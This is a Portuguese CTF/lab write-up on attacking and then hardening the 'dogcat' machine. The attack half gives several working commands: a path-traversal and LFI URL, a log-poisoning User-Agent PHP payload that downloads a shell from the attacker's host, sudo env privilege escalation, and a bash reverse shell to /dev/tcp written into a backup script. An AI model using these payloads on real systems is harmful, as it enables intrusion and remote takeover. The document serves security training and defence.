Maquina vulneravel (como atacar): 
![[Pasted image 20250805112448.png]]
Como o site não possui muitas funcionalidades uma das primeiras coisas que podemos fazer é mexer na URL dele para tentar caminhar pelos diretórios.
`<host>/?view=dog/../../../../../etc/passwd`
![[Pasted image 20250805112541.png]]
Notamos que o site nos devolve um erro que nos informa sobre uma função que adiciona ".php" na frente do final da query. Usando essa informação podemos tentar pegar o index do site.
![[Pasted image 20250805112817.png]]
Podemos ver que acertamos o arquivo porém ele esta carregando a si mesmo, o que da um erro. Usando um PHP Wrapper ( `php://filter/convert.base64-encode/resource=`), podemos traduzir o código para Base64 e tentar exfiltrar ele e ver o que o index.php do site faz.
![[Pasted image 20250805113012.png]]
Depois de decodificar a mensagem temos o seguinte:
```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
Podemos ver que na parte do PHP temos a query ext que retira o ".php" da URL, permitindo navegar o diretório.
![[Pasted image 20250805114159.png]]
Podemos usar isso para ver os logs da aplicação: `<ip>/?view=dog/../../../../../var/log/apache2/access.log&ext=´
![[Pasted image 20250805114344.png]]
Testando um pouco mais a aplicação vemos que nos logs as URL são codificadas, mas o User-Agent não, assim, podemos injetar código na aplicação usando o campo do User-Agente:
` User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<seu-ip>:<port>/<seuarquivoshell.php>')); ?>
![[Pasted image 20250805115959.png]]
Agora podemos acessar o arquivo de dentro do site, mas antes temos que subir um listener:
`netcat -lvnp <port>`

Acessamos: `http://<ip>/?view=dog/../shell.php&ext=`
![[Screenshot_2025-08-05_12-03-18.png]]

Agora podemos mexer dentro da maquina.
Primeiro temos que conseguir privilegios, para isso, podemos usar o comando `sudo -l`, que nos mostrar que comandos podemos usar sem ser root.
A máquina foi configurada com o binário `env` rodar como root sem senha. Podemos utiliza-lo para conseguir um shell root.
`sudo env /bin/bash`

![[Screenshot_2025-08-05_12-06-10.png]]
Temos root, porem, não paramos por ai, vemos que o hostname da maquina é `f5919935f134`, isso quer dizer que estamos dentro de um container.
Descobrimos que o container tem um backup dentro da pasta `/opt/backups`
e um script .sh para realiza-lo. Podemos alterar o backup.sh com um reverse shell bash simples para quando a maquina real executa-lo rodar nossa shell nos permitindo acesso a maquina real.
```bash
echo -e  '#!/bin/bash\nbash -i >& /dev/tcp/192.168.18.55/4446 0>&1' > backup.sh
```
![[Screenshot_2025-08-05_12-18-25.png]]
Conseguimos root na maquina!

**Maquina Defesa (como usar e o que foi mudado)**
Para utilizar a maquina temos que alterar usar o host atribuido ao endereço dela, para que o WAF implementado saiba a aplicação que vamos usar, isso pode ser feito alterando o arquivo /etc/hosts.
![[Screenshot_2025-08-05_12-26-36.png]]
Adicionamos a linha com `<ip da maquina>   dogcat.jims`
![[Screenshot_2025-08-05_12-27-39.png]]
Agora quando testamos qualquer exploit, o servidor devolve o seguinte:
![[Screenshot_2025-08-05_12-28-18.png]]
Neste simples passo já paramos o atacante completamente. Mas ainda há outras alterações que devem ser feitas para aumentar a segurança da aplicação.
1. Alterações no código (vendo o código anterior na sessão do ataque):
	Podemos alterar o código do index.php, para não permitir o acesso de outras paginas usando a query ext. Além disso implementamos uma whitelist para os caminhos permitidos. (ver CWEs e comentar sobre)
	![[Screenshot_2025-08-05_12-31-20.png]]
2. A binario env, não deve ser usado sem senha como root. Devemos retirar o ele do arquivo /etc/sudoers. (ver como fazer isso)
3. O backup do container deve ser feito por um usuario alternativo ao root da maquina com privilegios reduzidos.(ver como criar novo user e fazer isso)